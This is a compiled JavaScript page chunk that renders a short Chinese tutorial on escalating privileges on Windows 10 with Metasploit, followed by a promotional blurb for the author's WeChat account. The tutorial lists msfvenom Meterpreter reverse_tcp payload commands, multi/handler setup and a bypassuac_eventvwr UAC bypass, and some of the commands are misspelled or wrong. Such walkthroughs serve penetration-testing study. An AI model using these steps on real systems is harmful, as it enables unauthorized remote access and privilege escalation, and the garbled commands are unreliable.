(window.webpackJsonp=window.webpackJsonp||[]).push([[247],{538:function(s,a,t){"use strict";t.r(a);var e=t(7),n=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"metasploit-win10提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#metasploit-win10提权"}},[s._v("#")]),s._v(" Metasploit Win10提权")]),s._v(" "),a("h2",{attrs:{id:"查看目标主机的操作系统"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看目标主机的操作系统"}},[s._v("#")]),s._v(" 查看目标主机的操作系统")]),s._v(" "),a("p",[a("strong",[s._v("a) X86操作系统")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("kali"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# msfvnom –p payload/windows/meterpreter/reverse_tcp ")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("b) X64操作系统")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("kali"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# msfvnom –p payload/windows/x64/meterpreter/reverse_tcp")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"使用msf建立会话"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用msf建立会话"}},[s._v("#")]),s._v(" 使用msf建立会话")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("msf exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" use exploit/multi/handler\nmsf exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload windows/x64/meterpreter/reverse_tcp \nmsf exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload windows/meterpreter/reverse_tcp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("h2",{attrs:{id:"提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#提权"}},[s._v("#")]),s._v(" 提权")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("msf exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" search bypassuac //使用bypassuac"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("绕过用户帐户控制"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \nmsf exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload exploit/windows/local/bypassuac_eventvwr "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 在x64使用成功 ")]),s._v("\nmsf exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload windows/x64/meterprese/reverse_tcp \nmsf exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" show targets //查看目标，可选项，根据操作系统选择 \nmsf exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" target "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#设置目标为x64，0：x86 ")]),s._v("\nmsf exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" exploit\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),a("blockquote",[a("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=n.exports}}]);